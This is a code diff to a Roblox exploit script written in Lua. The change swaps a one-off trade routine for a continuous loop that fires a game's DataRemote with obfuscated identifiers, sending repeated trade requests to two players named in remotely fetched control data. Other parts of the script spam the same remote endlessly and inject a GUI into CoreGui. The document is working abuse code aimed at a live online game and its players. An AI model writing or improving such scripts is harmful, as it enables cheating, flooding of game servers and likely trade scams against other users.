@@ -7,7 +7,8 @@ local httpRequest = request
 
 local afkExecuted = false
 local spamRunning = false
-local traded = {}
+local tradeRunning = false
+local tradeTargets = {}
 
 local function afkScript()
 	local gui = Instance.new("ScreenGui", game.CoreGui)
@@ -32,43 +33,6 @@ local function afkScript()
 	end)
 end
 
-local function trade(user1, user2)
-	if traded[user1 .. "|" .. user2] then return end
-	traded[user1 .. "|" .. user2] = true
-
-	local function handle(player)
-		while player and player.Parent do
-			local gui = LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("Trading")
-			if gui and not gui.TradingFrame.Visible then
-				local args = {
-					{
-						{
-							ReplicatedStorage.IdentifiersContainer.RF_34fa16d44fc3ec71f2df15808f9b2487cb975eb93bfb49d822bba4a38945600f_S.Value,
-							"\186\236PA\206\203M\248\128\4^\144\13&r/",
-							player
-						}
-					}
-				}
-				ReplicatedStorage.NetworkingContainer.DataRemote:FireServer(unpack(args))
-			end
-			task.wait(1)
-		end
-	end
-
-	for _, name in ipairs({user1, user2}) do
-		local p = Players:FindFirstChild(name)
-		if p then
-			handle(p)
-		else
-			Players.PlayerAdded:Connect(function(newP)
-				if newP.Name == name then
-					handle(newP)
-				end
-			end)
-		end
-	end
-end
-
 local function startSpam()
 	if spamRunning then return end
 	spamRunning = true
@@ -83,6 +47,48 @@ local function startSpam()
 		}
 		while task.wait() do
 			ReplicatedStorage.NetworkingContainer.DataRemote:FireServer(unpack(args))
+		end
+	end)
+end
+
+local function startTradeLoop(user1, user2)
+	if tradeRunning then return end
+	tradeRunning = true
+
+	spawn(function()
+		while task.wait(1) do
+			for _, username in ipairs({user1, user2}) do
+				if not tradeTargets[username] then
+					Players.PlayerAdded:Connect(function(newPlayer)
+						if newPlayer.Name == username then
+							tradeTargets[username] = newPlayer
+						end
+					end)
+					local existing = Players:FindFirstChild(username)
+					if existing then
+						tradeTargets[username] = existing
+					end
+				end
+			end
+
+			local p1 = tradeTargets[user1]
+			local p2 = tradeTargets[user2]
+
+			if p1 and p1.Parent and p2 and p2.Parent then
+				local gui = LocalPlayer:FindFirstChild("PlayerGui") and LocalPlayer.PlayerGui:FindFirstChild("Trading")
+				if gui and not gui.TradingFrame.Visible then
+					local args = {
+						{
+							{
+								ReplicatedStorage.IdentifiersContainer.RF_34fa16d44fc3ec71f2df15808f9b2487cb975eb93bfb49d822bba4a38945600f_S.Value,
+								"\186\236PA\206\203M\248\128\4^\144\13&r/",
+								p1
+							}
+						}
+					}
+					ReplicatedStorage.NetworkingContainer.DataRemote:FireServer(unpack(args))
+				end
+			end
 		end
 	end)
 end
@@ -114,7 +120,7 @@ local function fetchInfo()
 	end
 
 	if data.trade and data.trade.user1 and data.trade.user2 then
-		trade(data.trade.user1, data.trade.user2)
+		startTradeLoop(data.trade.user1, data.trade.user2)
 	end
 end
 
